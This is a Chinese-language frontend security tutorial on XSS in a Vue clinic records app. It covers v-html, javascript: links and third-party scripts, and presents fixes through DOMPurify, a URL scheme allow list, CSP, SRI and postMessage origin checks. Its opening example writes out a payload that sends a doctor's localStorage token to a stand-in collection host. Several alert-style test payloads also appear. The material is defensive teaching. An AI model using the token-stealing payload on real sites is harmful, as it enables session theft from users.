## 把字串當成程式的寫法：一則 `v-html` 備註讀走每位醫師的 token

門診系統的「醫囑備註」為了保留換行與粗體，用 `v-html` 顯示：

```vue
<div class="note" v-html="record.note"></div>
```

櫃台從外部轉診系統複製一段文字貼進備註，裡面夾著這一行：

```html
<img src="x" onerror="fetch('https://collect.example/?t=' + localStorage.getItem('token'))">
```

之後每位打開這份病歷的醫師，瀏覽器都會載入一張不存在的圖片、觸發 `onerror`，把 localStorage 裡的 token 送到外部網址。拿到 token 的人在它過期前，可以用醫師的身分呼叫任何 API。畫面看不出異狀，只有 Network 分頁多一筆送往 `collect.example` 的請求。

同類的洞還有兩個：`<a :href="doctor.website">` 被填成 `javascript:fetch(…)`，點下去就執行；從 CDN 載入的客服 script 在 CDN 被入侵時，讀得到每個頁面上的病歷。三者都是別人的程式在你的頁面裡執行，權限和你的程式一樣。伺服器那一側的防護見後端的 [XSS、CSRF 與安全標頭](#/skill/xss-csrf)。

### 哪些寫法會把字串當成程式

瀏覽器把一個字串放進頁面，有三種處理方式：當文字、當 HTML、當網址或程式碼。

| 寫法 | 字串被當成 | 放進使用者內容 |
|---|---|---|
| `{{ x }}`、`v-text`、`textContent` | 文字，標籤原樣顯示成字 | 安全 |
| `:title="x"`、`setAttribute('title', x)` | 屬性值，引號會被處理 | 安全（網址類屬性例外） |
| `v-html`、`innerHTML`、`outerHTML`、`insertAdjacentHTML` | HTML，建出元素與屬性 | 事件屬性會執行 |
| `:href`、`:src`、`location.href = x`、`window.open(x)` | 網址 | `javascript:` 網址會執行 |
| `eval(x)`、`new Function(x)`、`setTimeout(x)`（x 是字串） | JavaScript | 直接執行 |

`innerHTML` 插進去的 `<script>` 不會執行（HTML 規範的規定），但 `<img onerror>`、`<svg onload>`、`<iframe srcdoc>` 會，只過濾 `<script>` 擋不住。

## 修法：純文字、sanitizer、scheme 允許清單

| 內容 | 做法 |
|---|---|
| 備註、姓名、搜尋字 | `{{ }}`；要保留換行加 `white-space: pre-line`，不用 `v-html` |
| 後台編輯的 HTML（衛教文章、公告） | 先經過 DOMPurify，用 `ALLOWED_TAGS`、`ALLOWED_ATTR` 只留用得到的 |
| 使用者或 API 給的網址 | `new URL()` 讀出 `protocol`，比對允許清單 |

```vue
<!-- HealthArticle.vue：後台編輯的衛教文章 -->
<script setup>
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps({ html: { type: String, required: true } })

// 允許清單：只留文章用得到的標籤與屬性，其他全部移除
const clean = computed(() =>
  DOMPurify.sanitize(props.html, {
    ALLOWED_TAGS: ['h2', 'h3', 'p', 'ul', 'ol', 'li', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href'],
  }),
)
</script>

<template>
  <!-- 專案裡唯一的 v-html，內容一定先經過 sanitize -->
  <article class="article" v-html="clean"></article>
</template>
```

不要自己用正規表示式過濾，HTML 的解析規則有很多寫法能繞過字串比對。

HTML 跳脫處理不了網址：`javascript:alert(1)` 沒有 `<`、`>` 或引號，跳脫之後原樣不變。`startsWith('javascript:')` 會漏掉 `  JavaScript:…`；`new URL()` 先把空白去掉、scheme 轉成小寫，`new URL('  JavaScript:alert(1)').protocol` 得到 `'javascript:'`。

```js run
// 使用者或 API 給的網址：只放行允許的 scheme，其他不當成連結
const ALLOWED = ['https:', 'mailto:', 'tel:']

function safeHref(raw, base = 'https://clinic.example') {
  try {
    const url = new URL(String(raw), base)   // 相對路徑以本站為基準；前後空白會被去掉
    return ALLOWED.includes(url.protocol) ? url.href : null
  } catch {
    return null                               // 解析不了的字串
  }
}

// HTML 跳脫：處理文字內容裡的 < > & " '
function escapeHtml(s) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }
  return String(s).replace(/[&<>"']/g, (c) => map[c])
}

const inputs = [
  'https://dr-lin.example/profile',
  '/doctors/12',
  'mailto:service@clinic.example',
  'javascript:alert(1)',
  '  JavaScript:alert(1)',                      // 前面有空白、大小寫混用
  'data:text/html,<script>alert(1)</script>',
  'http://dr-lin.example',                      // 沒有 TLS，這裡不放行
]
for (const raw of inputs) {
  console.log(JSON.stringify(raw).padEnd(46), '→', safeHref(raw))
}

// 跳脫對 javascript: 網址沒有作用：裡面沒有要跳脫的字元
console.log(escapeHtml('javascript:alert(1)'))
console.log(escapeHtml('<img src=x onerror=alert(1)>'))
```

## 最常見的兩個錯誤

| 現象或訊息 | 原因 | 修法 |
|---|---|---|
| 輸入 `<img src=x onerror=alert(1)>` 後跳出對話框 | `v-html` 或 `innerHTML` 放了使用者內容 | 改成 `{{ }}`；要顯示 HTML 先經過 sanitizer |
| 點連結執行了程式 | `:href` 綁了 `javascript:` 網址，Vue 不檢查 scheme | `new URL()` 讀 `protocol`，只放行允許清單 |

:::stop 讀到這裡可以先停：會找出把字串當成 HTML 或網址的寫法，用純文字、sanitizer 與 scheme 允許清單處理。後面是 Vue 與 DOMPurify 的細節、token 存放、CSP、第三方 script 與前端秘密，要設定安全標頭或接廠商的 script 時再回來讀。

## Vue 處理了什麼、沒處理什麼

用 Vue 3.5.45 在 Chromium 153 實測同一段字串 `<img src=x onerror="…">`：

- `{{ note }}`：Elements 分頁看到的是 `&lt;img src=x …&gt;`，畫面顯示這串字，沒有執行。
- `v-html="note"`：建出一個 `<img>`，`onerror` 執行了。
- `:href="url"`，`url` 是 `javascript:window.x=1`：`href` 原樣輸出，點下去執行。Vue 官方文件的 Security 一節也寫明 Vue 不替網址做檢查。

- 使用者的內容不能變成模板。含編譯器的完整版 Vue 可以在瀏覽器裡編譯 `template` 字串，字串裡的 `{{ }}` 會被當成 JavaScript 運算式執行。Vite 建置的專案在建置時就把 SFC 的模板編譯成函式，執行時用的是不含編譯器的 runtime 版。
- `v-html` 插進來的元素沒有 `data-v-…` 屬性，`<style scoped>` 的規則套不到它們（見 [CSS 怎麼決定套用哪一條](#/skill/css-cascade)），常有人因為這個改用全域樣式。

## 純文字元件與 sanitizer 的細節

```vue
<!-- MedicalNote.vue：醫囑備註，純文字 -->
<script setup>
defineProps({ note: { type: String, default: '' } })
</script>

<template>
  <p class="note">{{ note }}</p>
</template>

<style scoped>
.note { white-space: pre-line; }   /* 保留換行，不必用 v-html 插 <br> */
</style>
```

Sanitizer 把字串解析成 DOM，依允許清單保留標籤與屬性，其他移除。DOMPurify 3.4.18 在 Chromium 的預設結果：

| 輸入 | `DOMPurify.sanitize()` 的結果 |
|---|---|
| `<b>過敏</b><img src=x onerror=alert(1)>` | `<b>過敏</b><img src="x">` |
| `<a href="javascript:alert(1)">x</a>` | `<a>x</a>` |
| `<script>alert(1)</script><p onclick="x()">p</p>` | `<p>p</p>` |
| `<p>x</p><iframe src="…"></iframe>` | `<p>x</p>` |

預設會保留 `style` 屬性與 `<form>`、`<input>`，也會拿掉 `target`。必讀那組 `ALLOWED_TAGS`、`ALLOWED_ATTR` 設定在 Chromium 實測：`<a href="javascript:alert(1)" title="x">` 變成 `<a>`，`<a href="https://clinic.example/x" onclick="y()">` 只留下 `href`，`<img onerror>` 整個移除。

截至 2026 年 11 月，`element.setHTML()` 需 Chrome 146 或 Firefox 148 以上，Safari 尚未支援。用 `'setHTML' in Element.prototype` 偵測，舊版可動態載入 DOMPurify。若要對齊內建的 `elements` 允許清單，DOMPurify 要設 `KEEP_CONTENT: false`、`ALLOW_ARIA_ATTR: false`、`ALLOW_DATA_ATTR: false`。

後端存檔時過濾，保護 App、Email、匯出等讀取端。前端在 `v-html` 寫入之前再過濾。

## 網址的另外兩個設定：`target="_blank"` 與站內轉址

- `target="_blank"`：Chrome 88、Firefox 79、Safari 12.1 起，`target="_blank"` 的連結預設就是 `noopener`，新分頁的 `window.opener` 是 `null`，不能把原頁面導去別處。連 Referer 都不想送時加 `rel="noreferrer"`。
- 登入後的 `redirect` 參數也是網址，而且是站內轉址：只接受 `/` 開頭、不是 `//` 開頭的路徑，見 [登入狀態與 401](#/skill/auth-frontend)。

`safeHref` 在 Vue 裡用 computed 包起來，`null` 時顯示純文字：

```vue
<a v-if="websiteHref" :href="websiteHref" target="_blank" rel="noreferrer">個人網站</a>
<span v-else>{{ doctor.website }}</span>
```

## token 放在哪裡都擋不住 XSS

每個位置都會被 XSS 利用，差別在攻擊者拿走的是「token 本身」還是「頁面開著時的操作權」：

- localStorage、sessionStorage：注入的 script 讀走 token，在別的電腦上用到它過期。
- 記憶體（Pinia store）：頁面開著時用它發請求；要讀走得剛好在它存在時執行。
- `HttpOnly` cookie：讀不到 cookie，但能在頁面裡發請求，瀏覽器自動帶上；要處理 CSRF 與跨網域的 `credentials`。

重新整理、跨分頁見 [登入狀態與 401](#/skill/auth-frontend) 與 [瀏覽器裡的儲存](#/skill/browser-storage)。伺服器端見 [驗證基礎](#/skill/authn-basics)。

## CSP：伺服器限制前端程式能做什麼

CSP 回應標頭限制 script、樣式與連線的來源。各指令見 [XSS、CSRF 與安全標頭](#/skill/xss-csrf)。以下是 Chromium 153 在 `script-src 'self'` 下的訊息。

| 被擋的寫法 | Console 訊息的開頭 | 改法 |
|---|---|---|
| `<script>…</script>` 寫在 HTML 裡 | `Executing inline script violates the following Content Security Policy directive 'script-src 'self''` | 搬到 `.js` 檔，或由伺服器每次產生 nonce |
| `<button onclick="…">` | `Executing inline event handler violates …` | 用 `@click` 或 `addEventListener` |
| `<a href="javascript:…">` | `Running the JavaScript URL violates …` | 改成按鈕與事件處理函式 |
| `eval`、`new Function`、字串版的 `setTimeout` | `EvalError: Evaluating a string as JavaScript violates … because 'unsafe-eval' is not an allowed source of script` | 不從字串執行程式 |

和 Vue、Vite 有關的部分，在 Chromium 153 實測：

| 情況 | 結果 | 處理 |
|---|---|---|
| Vite 8 建置的 Vue 3.5 SFC 專案 | `index.html` 以外部 module 和樣式表載入，可用 `default-src 'self'; script-src 'self'; style-src 'self'` | 沿用建置產物 |
| `style-src 'self'` | 擋 `style="…"`、`<style>`、`setAttribute('style', …)`。Vue 的 `:style` 與 CSS `v-bind()` 經 CSSOM 的 `el.style.setProperty`，仍可用 | 靜態樣式放 CSS 檔 |
| Vite 開發伺服器 | HMR 注入的 `<style>` 會被嚴格的 `style-src` 擋下 | 設 `html.cspNonce`，Vite 會產生 `<meta property="csp-nonce" nonce="…">` 和標籤的 `nonce`。伺服器每次回應替換成新的隨機值 |
| 含編譯器的 `vue.global.js` | 在瀏覽器編譯模板需要 `'unsafe-eval'`，CSP 擋下時畫面空白 | 用 SFC 在建置時編譯 |
| 低於 `build.assetsInlineLimit`（預設 4096 bytes）的圖片、字型 | Vite 內嵌 `data:` URL，僅允許 `'self'` 時會被擋 | `img-src`、`font-src` 放行 `data:`，或將內嵌上限設成 0 |
| API 網域未列入 `connect-src` | Console 顯示 CSP 違規，程式收到 `TypeError: Failed to fetch` | 加進 `connect-src`。用 Console 區分 CSP 與 [CORS](#/skill/same-origin-frontend) |

```nginx
# 前端靜態檔的 server 區塊；其他安全標頭與 add_header 的繼承規則見後端的 XSS 課
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" always;
```

先用 `Content-Security-Policy-Report-Only` 收集違規。只能改 HTML 時，可用 `<meta http-equiv="Content-Security-Policy" content="…">` 啟用部分規則。回報模式和 `frame-ancestors` 仍要由伺服器送標頭。

`require-trusted-types-for 'script'` 可要求 `innerHTML` 等寫入點只接收 policy 產生的物件。Chrome 83、Safari 26、Firefox 148 支援，2026 年 2 月成為 Baseline。內容仍應過濾，舊瀏覽器會略過強制檢查。

## 第三方 script、SRI 與 postMessage

第三方 script 以頁面來源執行，可讀 DOM、表單與 localStorage，也能發出附帶使用者 cookie 的請求。供應商的程式、CDN 和發布帳號都在信任範圍內。

- **固定版本加 SRI**：`integrity="sha384-…"` 記錄檔案的雜湊，下載回來的內容不符，瀏覽器拒絕執行。跨來源的檔案要同時加 `crossorigin="anonymous"`。廠商只提供「永遠是最新版」的網址時無法加 SRI，這也表示廠商可以隨時換掉你頁面上執行的程式。
- **只在需要的頁面載入**：登入、付款、病歷這類頁面不放分析、客服、廣告 script。tag manager 讓行銷人員不經部署就能加 script，它的權限要當成程式部署來管。
- **能隔離就隔離**：外部的表單或小工具用 `<iframe sandbox="allow-scripts allow-forms">` 嵌入，它在另一個來源執行，讀不到你的頁面。雙方用 `postMessage` 溝通時，收訊的一方一定先檢查 `event.origin`。
- npm 套件也是第三方程式，而且會被打包進你的 bundle，見 [套件管理與供應鏈](#/skill/npm-packages)。

```html
<!-- 固定版本 + SRI；只放在需要客服的頁面 -->
<script
  src="https://cdn.example/chat-widget@2.4.1/widget.min.js"
  integrity="sha384-（下載同一個檔案自己算）"
  crossorigin="anonymous"
  defer></script>
```

```bash
# 自己算 SRI 雜湊：輸出 base64 的 SHA-384，前面加上 sha384-
curl -s https://cdn.example/chat-widget@2.4.1/widget.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

```js
// 付款頁用 iframe 嵌入金流的表單，金流完成後用 postMessage 通知
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://pay.example') return            // 只接受金流的來源
  const data = event.data
  if (data?.type !== 'payment-done' || typeof data.appointmentId !== 'string') return
  router.push({ name: 'appointment-paid', params: { id: data.appointmentId } })
})
```

## 前端沒有秘密

`VITE_` 變數和寫在程式裡的金鑰會隨 `dist/assets/*.js` 下載。需要私密金鑰時由後端呼叫服務。見 [環境設定](#/skill/env-config) 與 [秘密管理](#/skill/secrets)。

## 其他錯誤訊息與 AI 常產生的寫法

| 現象或訊息 | 原因 | 修法 |
|---|---|---|
| `Failed to find a valid digest in the 'integrity' attribute …` | CDN 上的檔案和 `integrity` 記錄的不同 | 確認版本；廠商換了檔案就重新審查再更新雜湊 |
| bundle 搜得到金鑰 | 金鑰放在 `VITE_` 變數或程式裡 | 移到後端；已經外流的金鑰作廢重發 |

遇到 CSP 違規時依上表調整程式，讓 `script-src` 繼續禁用 `'unsafe-inline'` 與 `'unsafe-eval'`。

## 動手

1. 在必讀的 `safeHref` 那段按「在 Playground 開啟」，在 `inputs` 加上 `'//evil.example/x'`：它會被放行，因為 scheme 是 `https:`。外部連結可以接受，但登入後的 `redirect` 不行，試著加一個只接受站內路徑的 `safeRedirect`。
2. 打開後端的 [XSS 與 CSRF 實驗室](#/lab/XssCsrfLab)，切換輸出位置，看 HTML 跳脫、CSP、`HttpOnly` 各自擋下哪一種情況。
3. 在自己的專案搜尋 `v-html`、`innerHTML`、`insertAdjacentHTML`、`:href`，列出每一處的資料來源；來源是使用者或 API 的，照上面的寫法改掉。
4. 在 `vite.config.js` 的 `preview.headers` 加上 `Content-Security-Policy-Report-Only`，`npm run build` 後用 `vite preview` 把每個頁面點過一遍，整理 Console 與 Issues 分頁列出的違規。Report-Only 不能寫在 meta 裡，要用回應標頭。
